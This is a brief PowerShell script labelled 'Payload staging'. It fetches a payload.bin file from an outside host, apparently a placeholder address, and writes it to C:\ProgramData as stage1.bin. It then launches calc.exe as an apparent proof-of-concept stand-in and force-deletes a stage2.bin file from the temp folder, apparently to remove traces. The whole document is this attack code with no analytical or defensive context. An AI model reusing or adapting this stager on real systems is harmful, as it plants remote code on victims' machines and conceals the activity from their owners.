
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://192.0.2.59/payload.bin',
    [string]$WorkingPath = "C:\ProgramData\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $WorkingPath)
Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
